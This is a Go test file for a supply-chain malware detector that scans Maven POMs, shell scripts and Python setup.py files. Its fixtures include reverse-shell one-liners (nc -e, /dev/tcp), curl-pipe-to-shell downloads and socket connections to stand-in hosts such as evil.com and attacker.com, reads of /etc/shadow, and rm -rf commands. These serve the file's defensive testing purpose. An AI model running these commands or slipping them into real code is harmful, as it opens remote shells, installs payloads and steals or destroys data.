// Test: maven-antrun-plugin with dangerous exec (curl) is still flagged
// Justification: Running curl via Ant's <exec> task downloads external resources
//                during build, which is a direct supply chain compromise vector.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — downloading
//         external resources during build is a documented attack vector.
// Methodology: Pass pom.xml with antrun using <exec executable="curl">
// Result: Expects HIGH risk and "maven-antrun-plugin" pattern detected
func TestAnalyzeJavaPOM_AntRunPluginDangerousExec(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <target>
                <exec executable="curl">
                  <arg value="-o"/>
                  <arg value="/tmp/payload.sh"/>
                  <arg value="https://evil.com/payload.sh"/>
                </exec>
              </target>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for antrun with curl exec")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "maven-antrun-plugin" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected maven-antrun-plugin pattern to be detected")
	}
}

// Test: exec-maven-plugin declared without configuration is not flagged
// Justification: A plugin declaration without any execution or configuration
//                does not execute anything during build. Some POMs declare plugins
//                in pluginManagement for version pinning without actual usage.
// Source: OSSF Scorecard — mere presence of a plugin dependency without execution
//         is not a risk signal.
// Methodology: Pass pom.xml with bare exec-maven-plugin declaration
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_ExecPluginDeclarationOnly(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on exec-maven-plugin declaration without config. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// Test: exec-maven-plugin with bash shell is flagged
// Justification: Running bash via exec-maven-plugin can execute arbitrary shell
//                scripts during build, which is a direct supply chain compromise
//                vector — the shell can download, execute, and exfiltrate.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — shell execution
//         during build is a documented supply chain attack technique.
// Methodology: Pass pom.xml with exec-maven-plugin running bash
// Result: Expects HIGH risk and "exec-maven-plugin" pattern detected
func TestAnalyzeJavaPOM_ExecPluginWithBash(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <configuration>
          <executable>bash</executable>
          <arguments>
            <argument>scripts/build.sh</argument>
          </arguments>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for exec-maven-plugin with bash")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "exec-maven-plugin" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected exec-maven-plugin pattern to be detected")
	}
}

// Test: maven-antrun-plugin with <script> task is flagged
// Justification: Ant's <script> task can execute arbitrary scripting code
//                (JavaScript, Groovy, etc.) during build, giving full access to
//                the build environment and filesystem.
// Source: SLSA framework — arbitrary scripting during build is a build integrity threat.
// Methodology: Pass pom.xml with antrun using <script> task
// Result: Expects HIGH risk and "maven-antrun-plugin" pattern detected
func TestAnalyzeJavaPOM_AntRunPluginScriptTask(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <target>
                <script language="javascript">
                  var file = new java.io.File("secret.txt");
                </script>
              </target>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for antrun with <script> task")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "maven-antrun-plugin" {
			found = true
		}
	}
	if !found {
		t.Error("Expected maven-antrun-plugin pattern to be detected")
	}
}

// ============================================================
// AnalyzeScript Tests (generic script patterns)
// ============================================================

// Test: netcat command used to open a reverse shell
// Justification: netcat with the -e flag spawns a shell connected to a remote
//                host, creating a classic reverse shell. This is the primary
//                mechanism for persistent remote access after initial compromise.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — reverse shell
//         techniques are documented post-exploitation patterns.
// Methodology: Pass nc -e /bin/sh command to AnalyzeScript
// Result: Expects HIGH risk and "netcat/telnet" pattern detected
func TestAnalyzeScript_Netcat(t *testing.T) {
	script := "nc -e /bin/sh attacker.com 4444"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	foundNetcat := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "netcat/telnet" {
			foundNetcat = true
		}
	}
	if !foundNetcat {
		t.Error("Expected to find netcat pattern")
	}
}

// Test: Bash /dev/tcp redirect for reverse shell without netcat
// Justification: /dev/tcp is a bash built-in that opens a TCP connection without
//                requiring external tools. Redirecting stdin/stdout through it
//                creates a reverse shell that bypasses firewalls blocking raw
//                socket tools like netcat.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — /dev/tcp
//         redirection documented as a netcat-free reverse shell technique.
// Methodology: Pass bash reverse shell using /dev/tcp to AnalyzeScript
// Result: Expects HIGH severity "/dev/tcp" pattern detected
func TestAnalyzeScript_DevTCP(t *testing.T) {
	script := "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundDevTCP := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "/dev/tcp" {
			foundDevTCP = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !foundDevTCP {
		t.Error("Expected to find /dev/tcp pattern")
	}
}

// Test: Reading system authentication files (passwd, shadow)
// Justification: /etc/passwd and /etc/shadow contain user account information
//                and password hashes. Exfiltrating these enables offline password
//                cracking and lateral movement.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — credential file
//         access is a documented supply chain attack exfiltration technique.
// Methodology: Pass cat /etc/passwd && /etc/shadow command to AnalyzeScript
// Result: Expects "system auth file access" pattern detected
func TestAnalyzeScript_SystemAuthFiles(t *testing.T) {
	script := "cat /etc/passwd && cat /etc/shadow"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundAuthFile := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "system auth file access" {
			foundAuthFile = true
		}
	}
	if !foundAuthFile {
		t.Error("Expected to find system auth file access pattern")
	}
}

// Test: Access to sensitive user config directories (~/.ssh, ~/.aws, ~/.gnupg)
// Justification: Accessing ~/.ssh/id_rsa, ~/.aws/credentials, or ~/.gnupg exfiltrates
//                private keys and cloud credentials. This enables persistent access,
//                account takeover, and lateral movement to cloud infrastructure.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — credential directory
//         enumeration is a documented npm/PyPI attack objective.
// Methodology: Pass cp to ~/.ssh/id_rsa command to AnalyzeScript
// Result: Expects "config directory access" pattern detected
func TestAnalyzeScript_ConfigDirectory(t *testing.T) {
	script := "cp sensitive-key ~/.ssh/id_rsa"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundConfig := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "config directory access" {
			foundConfig = true
		}
	}
	if !foundConfig {
		t.Error("Expected to find config directory access pattern")
	}
}

// Test: node -e inline code execution
// Justification: `node -e` executes arbitrary JavaScript from the command line.
//                In install scripts, this is commonly used to obfuscate payloads
//                that would otherwise be detected as suspicious JavaScript files.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — inline interpreter
//         invocation is a documented obfuscation technique.
// Methodology: Pass node -e with inline code to AnalyzeScript
// Result: Expects "node -e" pattern with MEDIUM severity detected
func TestAnalyzeScript_NodeEval(t *testing.T) {
	script := "node -e 'require(\"child_process\").exec(\"id\", console.log)'"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundNodeE := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "node -e" {
			foundNodeE = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for node -e, got %s", p.Severity)
			}
		}
	}
	if !foundNodeE {
		t.Error("Expected to find 'node -e' pattern")
	}
}

// Test: python -c inline code execution
// Justification: `python -c` executes arbitrary Python from the command line.
//                Attackers use this to embed obfuscated payloads directly in
//                shell scripts, bypassing file-based scanning.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — inline interpreter
//         invocation documented alongside base64 obfuscation patterns.
// Methodology: Pass python -c with inline os.system call to AnalyzeScript
// Result: Expects "python -c" pattern with MEDIUM severity detected
func TestAnalyzeScript_PythonInlineExec(t *testing.T) {
	script := "python -c 'import os; os.system(\"id\")'"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundPythonC := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "python -c" {
			foundPythonC = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for python -c, got %s", p.Severity)
			}
		}
	}
	if !foundPythonC {
		t.Error("Expected to find 'python -c' pattern")
	}
}

// Test: chmod +x makes a downloaded file executable
// Justification: chmod +x or chmod 777 is typically the last step before executing
//                a downloaded payload. Detection of this pattern alongside a download
//                command signals a two-stage dropper technique.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — chmod before
//         execution is a documented technique in npm/PyPI malware.
// Methodology: Pass chmod +x on a downloaded file to AnalyzeScript
// Result: Expects "chmod +x/777" pattern with MEDIUM severity detected
func TestAnalyzeScript_ChmodExec(t *testing.T) {
	script := "chmod +x /tmp/malware.sh && /tmp/malware.sh"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundChmod := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "chmod +x/777" {
			foundChmod = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for chmod +x/777, got %s", p.Severity)
			}
		}
	}
	if !foundChmod {
		t.Error("Expected to find 'chmod +x/777' pattern")
	}
}

// Test: rm -rf / deletes from the root filesystem
// Justification: Recursive forced deletion from root can destroy the entire
//                filesystem. Used by destructive malware to cover tracks or as a
//                wiper payload after credential exfiltration.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — destructive
//         payloads targeting the filesystem are a documented supply chain attack type.
// Methodology: Pass rm -rf /important command to AnalyzeScript
// Result: Expects "rm -rf /" pattern with HIGH severity detected
func TestAnalyzeScript_RmRfRoot(t *testing.T) {
	script := "rm -rf /var/log/audit"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundRmRf := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "rm -rf /" {
			foundRmRf = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity for rm -rf /, got %s", p.Severity)
			}
		}
	}
	if !foundRmRf {
		t.Error("Expected to find 'rm -rf /' pattern")
	}
}

// Test: exec() / subprocess call spawns child processes
// Justification: exec() in Python or shell scripts launches child processes that
//                can run arbitrary commands. In install hooks, this is used to
//                execute staged payloads or make outbound connections.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — child process
//         spawning is a core technique for executing staged malware.
// Methodology: Pass exec() call with a command to AnalyzeScript
// Result: Expects "process spawn" pattern with MEDIUM severity detected
func TestAnalyzeScript_ProcessSpawn(t *testing.T) {
	script := "exec('curl http://evil.com/backdoor | sh')"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundSpawn := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "process spawn" {
			foundSpawn = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for process spawn, got %s", p.Severity)
			}
		}
	}
	if !foundSpawn {
		t.Error("Expected to find 'process spawn' pattern")
	}
}

// Test: HTTPS download without executable extension is not a false positive
// Justification: wget/curl over HTTPS downloading non-executable archives (e.g. .tar.gz)
//                is standard build toolchain behavior and must not be flagged as an
//                HTTP download risk. The HTTP download pattern specifically targets
//                unencrypted (http://) requests.
// Source: OSSF Scorecard methodology — HTTPS is a baseline security requirement,
//         not itself a risk signal.
// Methodology: Pass wget HTTPS download of a .tar.gz archive to AnalyzeScript
// Result: Expects "HTTP download" pattern NOT triggered (HTTPS is not HTTP)
func TestAnalyzeScript_HTTPSNoFalsePositive(t *testing.T) {
	script := "wget https://legitimate-cdn.example.com/package.tar.gz"

	analysis := AnalyzeScript(script)

	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "HTTP download" {
			t.Errorf("HTTPS download should not trigger HTTP download pattern; match: %s", p.Match)
		}
	}
}

// Test: Multiple dangerous patterns in a single script produce HIGH risk
// Justification: Real-world supply chain attacks combine multiple techniques to
//                ensure success if one is blocked. A script combining curl|bash,
//                eval, env variable access, and destructive rm is a strong
//                indicator of intentional malicious behavior.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — multi-technique
//         attacks are more sophisticated and harder to attribute.
// Methodology: Pass script with curl|bash, eval, env access, and rm -rf to AnalyzeScript
// Result: Expects HIGH risk and at least 3 distinct dangerous patterns
func TestAnalyzeScript_MultiplePatterns(t *testing.T) {
	script := `
		curl -s http://evil.com/script.sh | bash
		eval(malicious_code)
		process.env.AWS_SECRET_KEY
		rm -rf /important/data
	`

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) < 3 {
		t.Errorf("Expected at least 3 dangerous patterns, got %d", len(analysis.DangerousPatterns))
	}

	patternNames := []string{}
	seen := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		if !seen[p.Pattern] {
			patternNames = append(patternNames, p.Pattern)
			seen[p.Pattern] = true
		}
	}
	if len(patternNames) < 3 {
		t.Errorf("Expected at least 3 distinct pattern types, got %d: %v", len(patternNames), patternNames)
	}
}

// Test: script with only HIGH severity patterns produces HIGH risk level
// Justification: The risk level algorithm elevates to HIGH as soon as any HIGH
//                severity pattern is detected. A single curl|bash is enough.
// Source: OSSF Scorecard — binary HIGH/MEDIUM/LOW risk thresholds based on
//         worst detected severity.
// Methodology: Verify that the risk level calculation correctly reflects HIGH
//              severity when at least one HIGH severity pattern is present.
// Result: Expects RiskLevel=HIGH when any pattern with Severity=HIGH is found
func TestAnalyzeScript_RiskLevelElevatesOnHighSeverityPattern(t *testing.T) {
	script := "curl http://evil.com/backdoor.sh | bash"

	analysis := AnalyzeScript(script)

	hasHighPattern := false
	for _, p := range analysis.DangerousPatterns {
		if p.Severity == "HIGH" {
			hasHighPattern = true
			break
		}
	}

	if hasHighPattern && analysis.RiskLevel != "HIGH" {
		t.Errorf("Risk level should be HIGH when a HIGH severity pattern is present, got %s", analysis.RiskLevel)
	}
	if !hasHighPattern {
		t.Error("Expected at least one HIGH severity pattern from curl|bash")
	}
}

// Test: Script with only MEDIUM severity patterns produces MEDIUM risk level
// Justification: When no HIGH severity patterns are present but MEDIUM patterns
//                exist, the risk level should reflect MEDIUM — not erroneously
//                collapse to LOW or escalate to HIGH.
// Source: OSSF Scorecard — tiered severity levels prevent alert fatigue while
//         ensuring moderate risks are communicated.
// Methodology: Pass a script with only base64 decode (MEDIUM) to AnalyzeScript
// Result: Expects RiskLevel=MEDIUM when only MEDIUM severity patterns are found
func TestAnalyzeScript_RiskLevelMediumOnlyMediumPatterns(t *testing.T) {
	script := "echo 'dGVzdA==' | base64 --decode"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected base64 decode to be detected")
	}

	for _, p := range analysis.DangerousPatterns {
		if p.Severity == "HIGH" {
			t.Errorf("Did not expect HIGH severity pattern, got: %s", p.Pattern)
		}
	}

	if analysis.RiskLevel != "MEDIUM" {
		t.Errorf("Expected MEDIUM risk level when only MEDIUM patterns present, got %s", analysis.RiskLevel)
	}
}

// Test: Match field captures the actual matched text from the script
// Justification: The Match field provides evidence for security analysts reviewing
//                alerts. It must contain the actual matched string, not a generic
//                description, to enable accurate triage.
// Source: OSSF Scorecard evidence trail requirements — findings must include
//         verifiable evidence, not just assertions.
// Methodology: Check that DangerousPattern.Match is non-empty and is a substring
//              of the analyzed script.
// Result: Expects Match field to be non-empty and present in the original script
func TestAnalyzeScript_MatchFieldContainsEvidence(t *testing.T) {
	script := "curl http://evil.com/script.sh | bash"

	analysis := AnalyzeScript(script)

	if len(analysis.DangerousPatterns) == 0 {
		t.Fatal("Expected at least one dangerous pattern")
	}

	for _, p := range analysis.DangerousPatterns {
		if p.Match == "" {
			t.Errorf("Pattern '%s' has empty Match field; should contain matched text", p.Pattern)
		}
		if !strings.Contains(script, p.Match) {
			t.Errorf("Pattern '%s' Match '%s' is not a substring of the original script", p.Pattern, p.Match)
		}
	}
}

// ============================================================
// AnalyzePythonSetup Enhanced Pattern Tests
// ============================================================

// Test: AnalyzePythonSetup detects os.system() calls
// Justification: os.system() in setup.py executes arbitrary shell commands during
//                pip install. This is the most common attack pattern in malicious
//                PyPI packages — used in typosquatting attacks like "python3-dateutil".
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — categorizes
//         os.system() as a primary code execution vector in supply chain attacks
// Methodology: Pass setup.py content with os.system() call to AnalyzePythonSetup
// Result: Detected as HIGH severity "os.system/popen/exec" pattern
func TestAnalyzePythonSetup_OsSystem(t *testing.T) {
	setupContent := `
from setuptools import setup
import os

os.system('curl https://evil.com/payload.sh | bash')

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for os.system() call")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "os.system/popen/exec" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected os.system/popen/exec pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects subprocess calls
// Justification: subprocess module calls in setup.py spawn child processes during
//                installation. Malicious packages use subprocess.Popen to run
//                reverse shells or download/execute payloads.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — subprocess
//         execution during install is a documented attack vector
// Methodology: Pass setup.py with subprocess.call() to AnalyzePythonSetup
// Result: Detected as HIGH severity "subprocess call" pattern
func TestAnalyzePythonSetup_Subprocess(t *testing.T) {
	setupContent := `
from setuptools import setup
import subprocess

subprocess.call(['wget', 'https://evil.com/malware', '-O', '/tmp/malware'])

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for subprocess.call()")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected subprocess call pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects base64 decode
// Justification: base64.b64decode() in setup.py is used to hide malicious payloads
//                from casual code review. The decoded data is typically passed to
//                exec() or os.system(). This pattern was seen in the "colourama"
//                typosquatting attack.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — obfuscation
//         via encoding is a documented supply chain attack technique
// Methodology: Pass setup.py with base64.b64decode() to AnalyzePythonSetup
// Result: Detected as HIGH severity "base64 decode" pattern
func TestAnalyzePythonSetup_Base64Decode(t *testing.T) {
	setupContent := `
from setuptools import setup
import base64

payload = base64.b64decode('aW1wb3J0IG9z')
exec(payload)

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for base64 decode + exec")
	}

	foundBase64 := false
	foundExec := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "base64 decode" {
			foundBase64 = true
		}
		if p.Pattern == "exec()" {
			foundExec = true
		}
	}
	if !foundBase64 {
		t.Error("Expected base64 decode pattern to be detected")
	}
	if !foundExec {
		t.Error("Expected exec() pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects socket connections
// Justification: Socket connections in setup.py indicate potential reverse shells
//                or data exfiltration channels. Legitimate packages never need raw
//                socket access during installation.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — reverse shells
//         via socket connections are a documented post-compromise technique
// Methodology: Pass setup.py with socket.socket() to AnalyzePythonSetup
// Result: Detected as HIGH severity "socket connection" pattern
func TestAnalyzePythonSetup_SocketConnection(t *testing.T) {
	setupContent := `
from setuptools import setup
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 4444))

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for socket connection")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "socket connection" {
			found = true
		}
	}
	if !found {
		t.Error("Expected socket connection pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects marshal.loads (bytecode deserialization)
// Justification: marshal.loads() deserializes Python bytecode objects which can
//                execute arbitrary code without visible Python source. This is an
//                advanced obfuscation technique used to hide malicious logic.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with marshal.loads() to AnalyzePythonSetup
// Result: Detected as HIGH severity "marshal.loads" pattern
func TestAnalyzePythonSetup_MarshalLoads(t *testing.T) {
	setupContent := `
from setuptools import setup
import marshal, types

code = marshal.loads(b'\xe3\x00\x00...')
exec(types.FunctionType(code, globals())())

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for marshal.loads()")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "marshal.loads" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected marshal.loads pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects ctypes library loading
// Justification: ctypes.CDLL() loads native shared libraries which can execute
//                arbitrary native code. Malicious packages can use this to load
//                downloaded binaries during installation.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with ctypes.CDLL() to AnalyzePythonSetup
// Result: Detected as HIGH severity "ctypes library load" pattern
func TestAnalyzePythonSetup_CtypesLoad(t *testing.T) {
	setupContent := `
from setuptools import setup
import ctypes

lib = ctypes.CDLL('/tmp/malicious.so')
lib.exploit()

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for ctypes.CDLL()")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "ctypes library load" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected ctypes library load pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects from-import of network libraries
// Justification: "from urllib.request import urlopen" is functionally identical
//                to "import urllib" for supply chain risk — both enable network
//                access during installation for data exfiltration or payload download.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020)
// Methodology: Pass setup.py with from-import of urllib to AnalyzePythonSetup
// Result: Detected as MEDIUM severity "network from-import" pattern
func TestAnalyzePythonSetup_FromImportNetwork(t *testing.T) {
	setupContent := `
from setuptools import setup
from urllib.request import urlopen

data = urlopen('https://evil.com/payload').read()

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for from-import of network library")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "network from-import" {
			found = true
		}
	}
	if !found {
		t.Error("Expected network from-import pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects combined obfuscation attack
// Justification: Real-world malicious setup.py files typically combine multiple
//                techniques: base64-encoded payload + exec() + network requests.
//                The analyzer must detect ALL patterns, not just the first one.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with multiple attack patterns to AnalyzePythonSetup
// Result: Multiple patterns detected, overall risk level is HIGH
func TestAnalyzePythonSetup_CombinedAttackPatterns(t *testing.T) {
	setupContent := `
from setuptools import setup
import os, base64, subprocess

payload = base64.b64decode('Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQ=')
exec(payload)
os.system('echo pwned')
subprocess.Popen(['wget', 'https://evil.com/backdoor'])

setup(
    name='totally-legit-pkg',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Fatal("Expected dangerous patterns for combined attack")
	}

	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level for combined attack, got %s", analysis.RiskLevel)
	}

	// Should detect at least 4 different patterns
	if len(analysis.DangerousPatterns) < 4 {
		t.Errorf("Expected at least 4 dangerous patterns for combined attack, got %d", len(analysis.DangerousPatterns))
	}

	// Verify specific patterns are detected
	patternSet := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patternSet[p.Pattern] = true
	}

	expectedPatterns := []string{"base64 decode", "exec()", "os.system/popen/exec", "cmdclass override"}
	for _, expected := range expectedPatterns {
		if !patternSet[expected] {
			t.Errorf("Expected pattern %q to be detected", expected)
		}
	}
}

// Test: AnalyzePythonSetup does not flag legitimate setup.py with only build deps
// Justification: Many legitimate packages use setup.py with standard setuptools
//                patterns (install_requires, packages, etc.). These should NOT be
//                flagged as suspicious — false positives reduce trust in the tool.
// Source: OSSF Scorecard methodology — minimize false positives
// Methodology: Pass a clean setup.py with only standard packaging boilerplate
// Result: No dangerous patterns, LOW risk level
func TestAnalyzePythonSetup_LegitimateSetupPy(t *testing.T) {
	setupContent := `
from setuptools import setup, find_packages

with open('README.md') as f:
    long_description = f.read()

setup(
    name='mypackage',
    version='1.0.0',
    description='A legitimate package',
    long_description=long_description,
    packages=find_packages(),
    install_requires=[
        'requests>=2.28.0',
        'click>=7.0',
    ],
    python_requires='>=3.7',
    classifiers=[
        'Programming Language :: Python :: 3',
    ],
)
`
	analysis := AnalyzePythonSetup(setupContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern)
		}
		t.Errorf("Expected no dangerous patterns for legitimate setup.py, got: %s", strings.Join(patterns, ", "))
	}

	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}
